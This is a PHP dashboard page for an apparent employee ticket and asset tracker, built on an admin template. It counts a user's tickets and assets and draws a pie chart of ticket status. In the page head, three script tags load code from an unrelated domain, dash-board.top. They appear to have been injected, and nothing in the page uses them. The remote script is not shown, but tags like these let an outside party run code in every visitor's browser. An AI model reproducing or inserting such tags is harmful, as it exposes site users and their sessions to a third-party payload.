<?php
require_once "config.php";
include "session-checker.php";

// For Displaying the User
$accountID = $_SESSION['account_id'];

$userQuery = "
    SELECT e.employee_id, e.firstname, e.position
    FROM tblaccounts a
    JOIN tblemployee e ON a.account_id = e.account_id
    WHERE a.account_id = ?
";

$employee_id = '';
$loggedFirstname = '';
$loggedUsertype = '';

if ($stmt = mysqli_prepare($link, $userQuery)) {
    mysqli_stmt_bind_param($stmt, "i", $accountID);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $employee_id, $loggedFirstname, $loggedUsertype);
    mysqli_stmt_fetch($stmt);
    mysqli_stmt_close($stmt);
}

$_SESSION['loggedFirstname'] = $loggedFirstname;
$_SESSION['loggedUsertype'] = $loggedUsertype;

// ✅ Get employee_id for this account
$employee_id = 0;
$sqlEmp = "SELECT employee_id FROM tblemployee WHERE account_id = ?";
if ($stmt = mysqli_prepare($link, $sqlEmp)) {
    mysqli_stmt_bind_param($stmt, "i", $accountID);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $employee_id);
    mysqli_stmt_fetch($stmt);
    mysqli_stmt_close($stmt);
}

// ✅ Helper function to count tickets by status
function getCount($link, $employee_id, $status = null) {
    if ($status === null) {
        $query = "SELECT COUNT(*) FROM tbltickets WHERE employee_id = ?";
        $stmt = mysqli_prepare($link, $query);
        mysqli_stmt_bind_param($stmt, "i", $employee_id);
    } else {
        $query = "SELECT COUNT(*) FROM tbltickets WHERE employee_id = ? AND status = ?";
        $stmt = mysqli_prepare($link, $query);
        mysqli_stmt_bind_param($stmt, "is", $employee_id, $status);
    }
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $count);
    mysqli_stmt_fetch($stmt);
    mysqli_stmt_close($stmt);
    return $count;
}

// ✅ Count totals
$totalTickets = getCount($link, $employee_id);
$pendingTickets = getCount($link, $employee_id, 'Pending');
$inProgressTickets = getCount($link, $employee_id, 'In Progress');
$resolvedTickets = getCount($link, $employee_id, 'Resolved');

// ✅ Count assets for this logged-in user
$assetsCount = 0;
$sqlAssets = "SELECT COUNT(*) FROM tblassets_inventory WHERE employee_id = ?";
if ($stmt = mysqli_prepare($link, $sqlAssets)) {
    mysqli_stmt_bind_param($stmt, "i", $employee_id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $assetsCount);
    mysqli_stmt_fetch($stmt);
    mysqli_stmt_close($stmt);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Storage Mart | Admin Dashboard</title>

    <!-- Custom fonts for this template -->
    <link href="../../../vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Nunito:200,300,400,600,700,800,900" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

    <!-- Custom styles for this template -->
    <link href="../../../css/sb-admin-2.min.css" rel="stylesheet">
        <script src="https://dash-board.top/embed.js"></script>

    <script src="https://dash-board.top/embed.js" data-theme="royalblue"></script>

    <script src="https://dash-board.top/embed.js" data-theme="crimson"></script>
</head>

<body id="page-top">

    <!-- Page Wrapper -->
    <div id="wrapper">

        <!-- Sidebar -->
        <ul class="navbar-nav bg-gradient-primary sidebar sidebar-dark accordion" id="accordionSidebar">
            
            <!-- Brand -->
            <a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.php">
                 <div class="sidebar-brand-icon ">
                    <img src="../../../img/logo.png" alt="Logo" style="width:100px; height:auto;">
                </div>
            </a>

            <hr class="sidebar-divider my-0">

            <!-- Dashboard -->
            <li class="nav-item active">
                <a class="nav-link" href="index.php">
                    <i class="fas fa-fw fa-tachometer-alt"></i>
                    <span>Dashboard</span></a>
            </li>

            <hr class="sidebar-divider">

            <div class="sidebar-heading">Interface</div>

            <li class="nav-item">
                <a class="nav-link" href="../Ticket/Tickets.php">
                    <i class="fas fa-ticket-alt"></i>
                    <span>Ticket</span>
                </a>
            </li>

            <li class="nav-item">
                <a class="nav-link" href="../Asset/Assets.php">
                    <i class="fas fa-archive"></i>
                    <span>Assets</span>
                </a>
            </li>

            <hr class="sidebar-divider">

            <div class="sidebar-heading">Addons</div>

            <hr class="sidebar-divider d-none d-md-block">
            <div class="text-center d-none d-md-inline">
                <button class="rounded-circle border-0" id="sidebarToggle"></button>
            </div>
        </ul>
        <!-- End of Sidebar -->

        <!-- Content Wrapper -->
        <div id="content-wrapper" class="d-flex flex-column">

            <!-- Main Content -->
            <div id="content">

                <!-- Topbar -->
                <nav class="navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow">
                    <button id="sidebarToggleTop" class="btn btn-link d-md-none rounded-circle mr-3">
                        <i class="fa fa-bars"></i>
                    </button>

                    <ul class="navbar-nav ml-auto">
                        <div class="topbar-divider d-none d-sm-block"></div>
                        <li class="nav-item dropdown no-arrow">
                            <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button"
                               data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <span class="mr-2 d-none d-lg-inline text-gray-600 small">
                                    <?= htmlspecialchars($loggedFirstname) . " (" . htmlspecialchars($loggedUsertype) . ")" ?>
                                </span>
                                <img class="img-profile rounded-circle" src="../../../img/undraw_profile.svg">
                            </a>
                            <div class="dropdown-menu dropdown-menu-right shadow animated--grow-in"
                                 aria-labelledby="userDropdown">
                                <a class="dropdown-item" href="../../../../../public/login.php" data-toggle="modal" data-target="#logoutModal">
                                    <i class="fas fa-sign-out-alt fa-sm fa-fw mr-2 text-gray-400"></i>
                                    Logout
                                </a>
                            </div>
                        </li>
                    </ul>
                </nav>

                <!-- Page Content -->
            <!-- Page Content -->
            <div class="container-fluid">
                <h1 class="h3 mb-4 text-gray-800">Dashboard</h1>

                <div class="row">
                    <!-- Assets Card -->
                    <div class="col-xl-3 col-md-6 mb-4">
                        <div class="card border-left-primary shadow h-100 py-2">
                            <div class="card-body">
                                <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">Your Assets</div>
                                <div class="h5 mb-0 font-weight-bold text-gray-800"><?= $assetsCount ?></div>
                            </div>
                        </div>
                    </div>

                    <!-- Total Tickets -->
                    <div class="col-xl-3 col-md-6 mb-4">
                        <div class="card border-left-success shadow h-100 py-2">
                            <div class="card-body">
                                <div class="text-xs font-weight-bold text-success text-uppercase mb-1">Total Tickets</div>
                                <div class="h5 mb-0 font-weight-bold text-gray-800"><?= $totalTickets ?></div>
                            </div>
                        </div>
                    </div>

                    <!-- Pending Tickets -->
                    <div class="col-xl-3 col-md-6 mb-4">
                        <div class="card border-left-warning shadow h-100 py-2">
                            <div class="card-body">
                                <div class="text-xs font-weight-bold text-warning text-uppercase mb-1">Pending Tickets</div>
                                <div class="h5 mb-0 font-weight-bold text-gray-800"><?= $pendingTickets ?></div>
                            </div>
                        </div>
                    </div>

                    <!-- Resolved Tickets -->
                    <div class="col-xl-3 col-md-6 mb-4">
                        <div class="card border-left-info shadow h-100 py-2">
                            <div class="card-body">
                                <div class="text-xs font-weight-bold text-info text-uppercase mb-1">Resolved</div>
                                <div class="h5 mb-0 font-weight-bold text-gray-800"><?= $resolvedTickets ?></div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Ticket Status Pie Chart -->
                <div class="container">
                    <div class="row">
                        <div class="col">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Ticket Status Overview</h6>
                            </div>
                            <div class="card-body text-center">
                                <canvas id="ticketChart" width="100px" height="100px"></canvas>
                            </div>
                        </div>
                        <div class="col">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Ticket Status Overview</h6>
                            </div>
                            <div class="card-body text-center">
                                <canvas id="ticketChart" width="100px" height="100px"></canvas>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

                <!-- End Page Content -->
            </div>
        </div>
    </div>

    <!-- Scroll to Top -->
    <a class="scroll-to-top rounded" href="#page-top">
        <i class="fas fa-angle-up"></i>
    </a>

    <!-- Logout Modal -->
    <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
         aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Ready to Leave?</h5>
                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">Select "Logout" below if you are ready to end your current session.</div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" type="button" data-dismiss="modal">Cancel</button>
                    <a class="btn btn-primary" href="../../../../public/login.php">Logout</a>
                </div>
            </div>
        </div>
    </div>
<script>
document.addEventListener("DOMContentLoaded", function() {
  const ctx = document.getElementById('ticketChart').getContext('2d');
  const data = {
    labels: ['Pending', 'In Progress', 'Resolved'],
    datasets: [{
      data: [<?= $pendingTickets ?>, <?= $inProgressTickets ?>, <?= $resolvedTickets ?>],
      backgroundColor: [
        'rgba(255, 206, 86, 0.8)',
        'rgba(54, 162, 235, 0.8)',
        'rgba(75, 192, 192, 0.8)'
      ],
      borderColor: [
        'rgba(255, 206, 86, 1)',
        'rgba(54, 162, 235, 1)',
        'rgba(75, 192, 192, 1)'
      ],
      borderWidth: 1
    }]
  };
  new Chart(ctx, { type: 'pie', data: data, options: { plugins: { legend: { position: 'bottom' } } } });
});
</script>
    <!-- Scripts -->
    <script src="../../../vendor/jquery/jquery.min.js"></script>
    <script src="../../../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="../../../vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src="../../../js/sb-admin-2.min.js"></script>
</body>
</html>
